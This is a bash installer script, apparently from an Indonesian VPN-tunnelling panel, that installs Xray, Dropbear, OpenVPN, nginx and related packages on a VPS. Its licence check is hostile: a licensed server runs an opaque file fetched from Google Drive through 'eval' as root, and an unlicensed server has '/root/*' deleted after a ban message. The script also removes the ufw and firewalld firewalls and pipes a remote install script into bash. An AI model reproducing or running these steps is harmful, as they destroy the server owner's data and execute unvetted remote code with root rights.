#!/bin/bash
clear
red='\e[1;31m'
green='\e[1;32m'
yell='\e[1;33m'
NC='\033[0m'
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
MYIP=$(cat /usr/bin/.ipvps)
    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/rosicenterstore/izin/main/ip" | grep "$MYIP" | awk '{print $4}')
    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
	ID_FILE="1kIvv6I1iiSlvL6sIdYYMXJ7TcBfdodxx"
	eval $(wget -qO- "https://drive.google.com/u/4/uc?id=${ID_FILE}")
    else
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m ⚠️       AKSES DI TOLAK         ⚠️ \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
echo -e ""
echo -e "  \033[0;33m🔒 Your VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m⚠️  Masa Aktif Sudah Habis ⚠️\033[0m"
echo -e "  \033[0;33m💡 Beli izin resmi hanya dari Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
echo -e "  \033[96m🌍 Telegram: https://nevpn.site\033[0m"
echo -e "  \033[96m📱 WhatsApp: https://whatsapp.nevpn.site\033[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
rm -rf /root/*
exit 1
	fi
echo "           Tools install...!"
echo "                  Progress..."
sleep 0.1

export DEBIAN_FRONTEND=noninteractive
apt update -y && apt upgrade -y && apt dist-upgrade -y
apt install sudo -y
sudo apt-get clean all
apt-get remove --purge -y stunnel4 apache2* bind9* sendmail* samba* unscd
apt install -y haproxy p7zip-full
apt install -y util-linux bsdmainutils debconf-utils  --no-install-recommends
apt-get remove --purge -y ufw firewalld exim4
apt-get autoremove -y
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
apt-get -y install \
  iptables iptables-persistent netfilter-persistent figlet ruby libxml-parser-perl \
  squid nmap screen curl jq bzip2 gzip coreutils rsyslog iftop htop zip unzip net-tools \
  sed gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl \
  screenfetch lsof openssl openvpn easy-rsa fail2ban tmux dropbear socat cron bash-completion \
  ntpsec-ntpdate xz-utils gnupg2 bind9-dnsutils lsb-release chrony libnss3-dev libnspr4-dev pkg-config libpam0g-dev \
  libcap-ng-dev libcap-ng-utils libselinux-dev libcurl4-openssl-dev flex bison make \
  libnss3-tools libevent-dev xl2tpd apt git speedtest-cli libjpeg-dev \
  zlib1g-dev python-is-python3 python3-pip shc build-essential nodejs nginx php \
  php-fpm php-cli php-mysql squid libcurl4-openssl-dev lsb-release gawk
gem install lolcat
gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
curl -sL "$gotop_link" -o /tmp/gotop.deb
dpkg -i /tmp/gotop.deb
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install --version 24.11.30
domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
chown -R www-data:www-data $domainSock_dir
# Make Folder XRay
mkdir -p /var/log/xray
mkdir -p /etc/xray
chmod +x /var/log/xray
touch /var/log/xray/access.log
touch /var/log/xray/error.log
touch /var/log/xray/access2.log
touch /var/log/xray/error2.log
chown -R www-data:www-data /etc/xray
chown -R www-data:www-data /var/log/xray
latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
sudo apt-get autoclean -y >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1

echo "           Instalasi selesai!"

yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
yellow "Dependencies successfully installed..."
mkdir -p /etc/bot
mkdir -p /etc/vmess
mkdir -p /etc/limit
mkdir -p /etc/kyt/limit/ssh
mkdir -p /etc/kyt/limit/vmess
mkdir -p /etc/kyt/limit/vless
mkdir -p /etc/kyt/limit/trojan
mkdir -p /etc/vless
mkdir -p /etc/trojan
mkdir -p /root/udp
clear
rm -r tools.sh
